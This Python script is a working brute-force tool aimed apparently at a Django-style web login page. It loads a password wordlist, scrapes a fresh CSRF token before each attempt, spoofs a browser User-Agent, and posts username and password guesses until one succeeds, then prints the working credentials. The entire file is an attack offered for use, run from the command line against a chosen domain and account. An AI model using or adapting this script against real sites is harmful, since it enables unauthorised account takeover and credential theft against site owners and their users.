import sys
import requests
from bs4 import BeautifulSoup


class Login:
    def __init__(self, domain: str, username: str, password: str):
        self.domain = domain
        self.username = username
        self.password = password
        self.cookies = {}
        self.session = requests.Session()
        self.url = domain + "en/login/?next=/en/top/"
        self.headers = {
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Referer': self.domain + 'en/login/?next=/en/top/'
        }
        try:
            self.f = open(password, "r")
            self.wordlist = list([(word.strip()) for word in self.f.readlines()])
            print(self.wordlist)
            self.f.close()
        except Exception as e:
            print("[-] Error:\n", e)
            exit()
        self.login_page = self.session.get(self.url)
        self.BruteForce()

    def BruteForce(self):
        count = 1
        # Start Brute Force
        for self.password in self.wordlist:
            for key, value in self.session.cookies.items():
                self.cookies[key] = value
            self.soup = BeautifulSoup(self.login_page.text, 'html.parser')
            self.csrf_input = self.soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

            url = self.domain + "en/login/?next=/en/top/"
            self.login_page = self.session.post(url, data={'csrfmiddlewaretoken': self.csrf_input,
                                                                'username': self.username,
                                                                'password': self.password}, cookies=self.cookies, headers=self.headers)
            if "CSRF" in self.login_page.text:
                print("[+] Error:\nCSRF token missing or incorrect.")
                exit()
            # print(self.login_page.text)
            if '<input type="password"' not in self.login_page.text and 'Login</button>' not in self.login_page.text:
                print("[+] Found! " + self.username + " - " + self.password + " - "+ str(self.login_page.status_code)+"\n\n")
                exit()                
            else:
                print("(" + str(count) + ") Attempt: username=" + username + " - password=" + self.password + " - status code="+ str(self.login_page.status_code))
                count += 1    


if __name__ == '__main__':
    try:
        domain = sys.argv[1]
        username = sys.argv[2]
        password = sys.argv[3]
        Login(domain,username,password)
    except IndexError:
        print(f"Command Line: python {sys.argv[0]} domain username wordlist_file")
